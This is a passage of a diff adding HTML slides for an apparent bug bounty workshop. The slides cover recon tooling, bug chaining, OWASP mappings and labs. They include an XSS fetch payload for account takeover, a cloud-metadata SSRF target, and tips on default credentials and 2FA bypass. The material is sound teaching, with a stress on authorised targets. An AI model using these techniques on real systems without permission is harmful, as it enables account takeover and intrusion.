+      Crunchbase is free. LinkedIn shows who moved from acquired-co to
+      parent-co. The old domains are in crt.sh. This is 30 minutes of OSINT
+      and it beats a week of fuzzing the hardened front door.
+    </aside>
+  </section>
+
+  <section>
+    <h3>The recon pipeline — visual</h3>
+    <pre><code class="text" data-trim>
+   subfinder + crt.sh + amass
+            │
+            ▼
+       dnsgen (permute)
+            │
+            ▼
+       dnsx (resolve)
+            │
+            ▼
+     httpx (probe, grab title/tech)
+            │
+     ┌──────┴──────┐
+     ▼             ▼
+  gowitness       nuclei
+ (screenshot)  (known vulns)
+     │             │
+     ▼             ▼
+  👀 EYEBALLS   auto-triage
+  (the weird      the boring
+   ones)          ones
+    </code></pre>
+    <p class="tiny dim">Automate the boring 90%. Spend your brain on the weird 10%.</p>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Discover</strong></td><td>subfinder, amass, assetfinder, github-subdomains</td></tr>
+      <tr><td><strong>Probe</strong></td><td>httpx, nuclei, gowitness, aquatone</td></tr>
+      <tr><td><strong>History</strong></td><td>waybackurls, gau, hakrawler</td></tr>
+      <tr><td><strong>OSINT</strong></td><td>Shodan, Censys, crt.sh, SecurityTrails, Crunchbase</td></tr>
+      <tr><td><strong>Method</strong></td><td>Jason Haddix "Bug Hunter's Methodology v4" — watch the talk</td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- CHAIN ATTACK — NEW SECTION FOR 2HR                           -->
+<!-- ============================================================ -->
+<section data-background-color="#1a0a1a">
+  <section>
+    <h1><span class="accent2">⛓️</span><br>Chaining It Together</h1>
+    <p class="dim">real attacks don't stay in one box</p>
+  </section>
+
+  <section>
+    <h3>Bugs are legos</h3>
+    <p class="small">
+      Individually: low/medium severity. Nobody cares.<br>
+      Chained: <span class="accent2">critical</span>. Everybody cares.
+    </p>
+    <div class="box small fragment">
+      <strong>Real chain from my reports — each step was "medium" alone:</strong><br><br>
+      <span class="accent">#04 Browser</span> → reflected XSS on a marketing subdomain (5.0, boring)<br>
+      <span class="accent">#02 API</span> → main API had <code>Access-Control-Allow-Origin: *.target.com</code><br>
+      <span class="accent">#03 Auth</span> → session cookie scoped to <code>.target.com</code> (not the app subdomain)<br>
+      <span class="accent">#04 Browser</span> → XSS payload: <code>fetch('https://app.target.com/api/me',{credentials:'include'})</code><br>
+      <span class="accent2">→ Account takeover from a marketing page XSS. Paid 8.3.</span><br><br>
+      <span class="dim">Three "won't-fix"-tier findings. One critical chain. The report that triages your bug doesn't see the other two.</span>
+    </div>
+  </section>
+
+  <section>
+    <h3>The universal kill chain</h3>
+    <pre><code class="text" data-trim>
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  RECON  ──▶  FOOTHOLD  ──▶  CREDS  ──▶  PIVOT  ──▶  IMPACT │
+│  (#10)      (#1-5,8)      (#3,6,9)    (#6,7)     (prove it) │
+│                                                             │
+│    ▲                                                        │
+│    └──────────── loop back, you have new info ──────────────┘
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+    </code></pre>
+    <p class="small dim">Every engagement. Every bug bounty. Every CTF. Same loop.</p>
+  </section>
+
+  <section>
+    <h3>Practice chaining in the workshop</h3>
+    <div class="box">
+      <strong>Challenge:</strong> connect any two labs.<br><br>
+      <ul class="small">
+        <li><span class="accent">Lab 10</span> (recon on Juice Shop JS) → find hidden endpoint → <span class="accent">Lab 01</span> (IDOR it)</li>
+        <li><span class="accent">Lab 05</span> (APK strings) → extract backend URL → <span class="accent">Lab 02</span> (mass-assign on that API)</li>
+        <li><span class="accent">Lab 09</span> (grep for bug in DVNA) → <span class="accent">Lab 01</span> (exploit in running instance)</li>
+        <li><span class="accent">Lab 08</span> (firmware creds) → <span class="accent">Lab 03</span> (reuse those creds on the web admin)</li>
+      </ul>
+      <br><span class="accent3">Best chain demo at the end gets a prize.</span> 🏆
+    </div>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- OWASP MAPPING (EXTENDED)                                     -->
+<!-- ============================================================ -->
+<section>
+  <section>
+    <h2>OWASP Top 10 ↔ Our 10 Areas</h2>
+    <table class="tiny">
+      <tr><th>OWASP 2021</th><th>Where</th><th>First thing to try</th></tr>
+      <tr><td><strong>A01</strong> Broken Access Control</td><td>#1, #2</td><td>Change the ID in the URL</td></tr>
+      <tr><td><strong>A02</strong> Crypto Failures</td><td>#3, #5</td><td>base64-decode every token</td></tr>
+      <tr><td><strong>A03</strong> Injection</td><td>#1, #4, #7</td><td>Put <code>'</code> in every field</td></tr>
+      <tr><td><strong>A04</strong> Insecure Design</td><td>#9</td><td>Read the code, find the "this is fine" comment</td></tr>
+      <tr><td><strong>A05</strong> Misconfiguration</td><td>#6, #8, #10</td><td>Try default creds, try <code>/.git/</code></td></tr>
+      <tr><td><strong>A06</strong> Vulnerable Components</td><td>#7, #9</td><td>Check <code>package.json</code> versions vs CVE DB</td></tr>
+      <tr><td><strong>A07</strong> Auth Failures</td><td>#3</td><td>Skip the 2FA step</td></tr>
+      <tr><td><strong>A08</strong> Integrity Failures</td><td>#7</td><td>Can you modify the pipeline?</td></tr>
+      <tr><td><strong>A09</strong> Logging Failures</td><td class="dim">—</td><td class="dim">(enjoy the lack of detection)</td></tr>
+      <tr><td><strong>A10</strong> SSRF</td><td>#6</td><td>Point the URL fetcher at <code>169.254.169.254</code></td></tr>
+    </table>
+  </section>
+
+  <section>
+    <h3>The only OWASP slide you need</h3>
+    <blockquote>
+      OWASP Top 10 isn't a checklist.<br><br>
+      It's <span class="accent">10 answers</span> to the same <span class="accent">3 questions</span>:<br><br>
+      Where does my data go?<br>
+      What does the server trust?<br>
+      What happens if I lie?
+    </blockquote>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- WRAP UP                                                      -->
+<!-- ============================================================ -->
+<section data-background-color="#0d1b2a">
+  <section>
+    <h2>What I want you to leave with</h2>
+    <ol>
+      <li class="fragment">Pick <strong class="accent">one</strong> area tonight. Do the "how to start."</li>
+      <li class="fragment">Start a <code class="accent">weird.md</code> file. Feed it.</li>
+      <li class="fragment">Chase weird things for <span class="accent">15 minutes</span>. Then write them down.</li>
+      <li class="fragment">Come back to the list when you're bored.</li>
+      <li class="fragment">Accidentally become good at this.</li>
+    </ol>
+  </section>
+
+  <section>
+    <h2>You don't need permission to start</h2>
+    <p class="small">
+      Legal targets are <span class="accent">everywhere</span>:
+    </p>
+    <div class="cols small">
+      <div class="col box">
+        <strong>Free labs</strong><br>
+        PortSwigger Academy<br>
+        HackTheBox / TryHackMe<br>
+        flaws.cloud<br>
+        OverTheWire
+      </div>
+      <div class="col box">
+        <strong>Real targets</strong><br>
+        Bug bounty (read scope!)<br>
+        Your own apps<br>
+        Your company's staging (ask)<br>
+        That router in your closet
+      </div>
+    </div>
+    <div class="box warn small fragment">
+      <strong>The one rule:</strong> not sure if you're allowed? You're not. Ask.
+    </div>
+  </section>
+
+  <section>
+    <h1>🛠️ Workshop Time</h1>
+    <p class="small"><strong>50 minutes.</strong> Here's the plan:</p>
+    <div class="box small">
+      <strong class="accent">0-35 min:</strong> Pick a lab. Work it. Pair up if you want.<br>
+      <strong class="accent">35-45 min:</strong> Chain challenge — connect two labs.<br>
+      <strong class="accent">45-50 min:</strong> Show & tell. Best chain wins.
+    </div>
+    <p class="dim tiny" style="margin-top:40px;">
+      Labs: <code>labs/WORKSHOP.md</code> · WiFi on the whiteboard · I'll be wandering
+    </p>
+  </section>
+
+  <section>
+    <h2>Thanks! Go break things.</h2>
+    <p>
+      <strong>Rotem Bar</strong><br>
+      <span class="dim small">
+        @rotembar · linkedin.com/in/rotembar<br>
+        Slides + labs: github.com/rotemb/hackthebay-workshop
+      </span>
+    </p>
+    <p class="tiny dim" style="margin-top:80px;">
+      DMs open. Weird bugs welcome.
+    </p>
+  </section>
+</section>
+
+</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.0.5/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.0.5/plugin/highlight/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.0.5/plugin/notes/notes.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.0.5/plugin/search/search.js"></script>
+<script>
+  Reveal.initialize({
+    hash: true,
+    slideNumber: 'c/t',
+    transition: 'slide',
+    transitionSpeed: 'fast',
+    controlsTutorial: false,
+    plugins: [ RevealHighlight, RevealNotes, RevealSearch ]
+  });
+</script>
+</body>
+</html>
